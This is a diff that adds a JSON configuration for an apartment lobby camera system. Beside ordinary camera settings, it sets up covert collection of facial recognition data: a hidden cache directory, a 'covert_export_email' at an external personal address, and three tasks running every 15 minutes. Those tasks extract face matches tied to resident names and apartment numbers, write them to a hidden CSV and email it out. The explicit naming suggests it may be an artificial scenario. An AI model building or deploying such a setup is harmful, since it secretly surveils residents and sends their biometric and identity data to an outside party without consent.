@@ -1,0 +1,98 @@
+{
+  "camera_system_config": {
+    "system_name": "ApartmentLobbySecureNet",
+    "version": "2.1.7",
+    "last_updated": "2023-11-15",
+    "settings": {
+      "log_parser_script": "camera_logs.py",
+      "log_directory": "/var/log/security/cameras/",
+      "archive_directory": "/var/log/security/archive/",
+      "hidden_data_directory": "/var/lib/system/.cache/analytics/",
+      "hidden_csv_filename": "facial_recognition_export.csv",
+      "data_capture_interval_minutes": 15,
+      "data_retention_days": 30,
+      "notification_email": "resident.alerts@securebuilding.com",
+      "covert_export_email": "personal.account@externalprovider.com",
+      "smtp_server": "smtp.securebuilding.com",
+      "smtp_port": 587,
+      "use_tls": true
+    },
+    "cameras": [
+      {
+        "camera_id": "LOBBY-NORTH-01",
+        "location": "Main Lobby North Entrance",
+        "log_file_path": "/var/log/security/cameras/lobby_north_01.log",
+        "is_active": true,
+        "has_facial_recognition": true,
+        "resolution": "4K"
+      },
+      {
+        "camera_id": "LOBBY-SOUTH-01",
+        "location": "Main Lobby South Entrance",
+        "log_file_path": "/var/log/security/cameras/lobby_south_01.log",
+        "is_active": true,
+        "has_facial_recognition": true,
+        "resolution": "1080p"
+      },
+      {
+        "camera_id": "LOBBY-ELEVATOR-01",
+        "location": "Lobby Elevator Bank A",
+        "log_file_path": "/var/log/security/cameras/lobby_elevator_01.log",
+        "is_active": true,
+        "has_facial_recognition": true,
+        "resolution": "2K"
+      },
+      {
+        "camera_id": "LOBBY-DESK-01",
+        "location": "Concierge Desk",
+        "log_file_path": "/var/log/security/cameras/lobby_desk_01.log",
+        "is_active": true,
+        "has_facial_recognition": false,
+        "resolution": "1080p"
+      },
+      {
+        "camera_id": "GARAGE-LOBBY-01",
+        "location": "Garage to Lobby Access",
+        "log_file_path": "/var/log/security/cameras/garage_lobby_01.log",
+        "is_active": true,
+        "has_facial_recognition": true,
+        "resolution": "1080p"
+      }
+    ],
+    "scheduled_tasks": [
+      {
+        "task_name": "parse_camera_logs",
+        "script": "camera_logs.py",
+        "schedule": "*/15 * * * *",
+        "function": "extract_facial_data",
+        "description": "Primary log parsing and data extraction"
+      },
+      {
+        "task_name": "export_covert_csv",
+        "script": "camera_logs.py",
+        "schedule": "*/15 * * * *",
+        "function": "export_to_hidden_csv",
+        "description": "Exports facial recognition data to hidden CSV"
+      },
+      {
+        "task_name": "email_covert_data",
+        "script": "camera_logs.py",
+        "schedule": "*/15 * * * *",
+        "function": "email_csv_attachment",
+        "description": "Emails the hidden CSV to external address"
+      }
+    ],
+    "data_fields_captured": [
+      "timestamp",
+      "camera_id",
+      "detected_face_id",
+      "confidence_score",
+      "estimated_age",
+      "estimated_gender",
+      "apartment_number_match",
+      "resident_name_match",
+      "bounding_box_coordinates",
+      "session_id"
+    ]
+  }
+}
